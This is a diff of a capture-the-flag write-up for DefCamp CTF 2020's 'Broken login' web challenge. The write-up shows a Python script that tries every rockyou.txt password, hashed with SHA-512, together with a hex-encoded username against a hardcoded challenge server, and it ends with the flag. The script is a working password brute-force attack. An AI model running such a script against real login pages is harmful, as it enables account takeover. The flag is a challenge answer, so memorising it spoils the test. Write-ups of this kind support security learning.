@@ -1,4 +1,3 @@
-﻿# DefCamp-CTF-2020-Broken-login
 Broken login (web/guessing, 365p, 20 solved)
 Description
 Intern season is up again and our new intern Alex had to do a simple login page. 
@@ -24,24 +23,23 @@ Finally the crystal ball has spoken -> maybe let's just try bruteforce the passw
 
 import codecs
 import hashlib
+
 import requests
-import binascii
+
 
 def main():
     with codecs.open("rockyou.txt", 'rb') as pass_file:
-        name = 'alex'  # Define 'name' outside the loop
         for p in pass_file.readlines():
             password = hashlib.sha512(p.strip()).hexdigest()
             print(password)
-            name_hex = binascii.hexlify(name.encode('utf-8')).decode('utf-8')
-            print(name_hex)
-            r = requests.get("http://35.198.135.192:31428/auth?name=" + name + "&password=" + password)
+            name = 'Alex'.encode("hex")
+            print(name)
+            r = requests.get("http://35.234.65.24:31441/auth?name=" + name + "&password=" + password)
             if 'Invalid' not in r.text:
                 print(p, r.text)
                 break
             print(p, r.text)
 
-if __name__ == '__main__':
-    main()
 
+main()
 And after a moment we get: CTF{bf3dd66e1c8e91683070d17ec2afb13375488eee109a0724bb872c9d70b7cc3d}
